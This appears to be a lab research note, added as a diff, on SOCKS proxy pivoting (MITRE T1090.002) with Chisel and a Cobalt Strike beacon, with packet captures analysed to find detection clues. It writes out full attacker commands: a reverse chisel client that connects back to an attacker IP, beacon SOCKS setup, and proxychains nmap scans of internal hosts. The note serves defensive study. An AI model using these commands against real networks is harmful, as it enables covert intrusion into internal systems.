@@ -1,0 +1,131 @@
+# T1090.002 SOCKS Proxy Pivoting
+
+## Description
+
+Adversaries might using proxy tools to establish a SOCKS proxy connection between the client (victim) and server (attacker) machine to redirect attacker network into target's internal network.
+
+This can be used to masquerade their actual c2 server from defender perspective.
+
+Various tools can perform this activity such as Chisel, Cobalt Strike beacon etc.
+
+## Experiment
+
+Simple layout from the test environment.
+
+```
+Attacker machine (Server proxy) -> External facing machine (Client proxy) -> Internal facing machine
+```
+
+### Chisel
+
+Victim's Internal machine IP address: 172.16.168.11\
+Victim's machine IP address: 192.168.168.121\
+Attacker's machine IP address: 192.168.45.229
+
+#### In Attacker Server
+
+```
+Setup Proxy Server in Attacker
+> chisel server --port 8082 --reverse
+```
+
+Once command above executed, it can see that the machine start listening to port `8082`. 
+
+![chisel_server_listening_port](./images/chisel_server_listening_port.png)
+
+#### In Victim Server
+
+```
+Setup Proxy Client in Victim
+> chisel.exe client <ATTACKER_MACHINE_IP>:8082 R:socks
+```
+
+![chisel_client_1](./images/chisel_client_1.png)
+
+#### Network Packet from Victim Machine
+
+```
+From attacker machine
+> proxychains nmap 172.16.168.11
+```
+
+![chisel_pcap_1](./images/chisel_pcap_1.jpg)
+
+It can bee seen that before the internal connection start, the victim machine will send some network packet to the port `8082` which is the SOCKS proxy establishment from attacker machine. Probably that might be a clue to identify the proxy connection.
+
+### Cobalt Strike Beacon
+
+Victim's Internal machine IP address: Internal 172.16.228.11\
+Victim's machine IP address: 192.168.228.121\
+Attacker's machine IP address: 192.168.45.193
+
+#### In Attacker Server
+
+```
+Attacker Teamserver
+beacon > socks 10597
+```
+
+Once created a SOCKS proxy, the teamserver will starts listen to the port set from command above.
+
+![cs_server_socks_1](images/cs_server_socks_1.png)
+
+```
+From attacker machine
+> sudo nano /etc/proxychains.conf
+
+Inside /etc/proxychains
+...
+[Proxy List]
+...
+# Add the line below
+socks4 192.168.45.193 10597
+...
+
+> proxychains nmap 172.16.228.11
+```
+
+#### In Victim Server
+
+Based on the pcap file caputre using `Pktmon`, there is no actual SOCKS proxy port found. However, before any initiation of between the internal machine, the attacker will pass the network forwarding data to victim machine via the attacker's machine listening port (in this case is port 443).
+
+![cs_client_socks_1](./images/cs_client_socks_1.png)
+
+Here is the decoded packet data found in the beacon that sent from teamserver. The command ID 0xE triggers the traffic forwarding function later.
+
+```
+Command used in attacker machine
+> proxychains nmap 120.10.13.129
+```
+
+![cs_client_packet](./images/cs_client_packet.png)
+
+> Packet count is Command count xD
+
+Screenshot below show the psedocode of beacon's traffic forwarding function.
+
+![cs_client_socket_conn_1](./images/cs_client_socket_conn_1.png)
+
+## Findings
+
+If network traffic is pass through proxy channel into internal network, you will only see the source IP of the machine where have the client SOCKS proxy installed and the target internal IP.
+
+This can be seen in the packet from screenshot above.
+Attacker executes `proxychains nmap 172.16.228.11` from their own machine to internal facing machine `172.16.228.11`, in the network packet data, the source address is the internal IP of the external machine instead of the attacker IP.
+
+The SOCKS proxy port is completely on the attacker (teamserver) side, where it can't be find in the victim (client) side. This means the beacon in the victim machine just a relay to forward the traffic to internal network, while the teamserver will handle the SOCKS proxy and generate traffic forwarding data.
+
+## Side Notes
+
+### Pktmon Command Used in Client Machine
+
+```
+Start moninitoring network 
+> pktmon start --capture 
+
+Stop monitoring network
+> pktmon stop
+
+Convert .etl to .pcap
+> pktmon etl2pcap <PATH_TO_ETL> -o <PATH_TO_PCAP>
+```
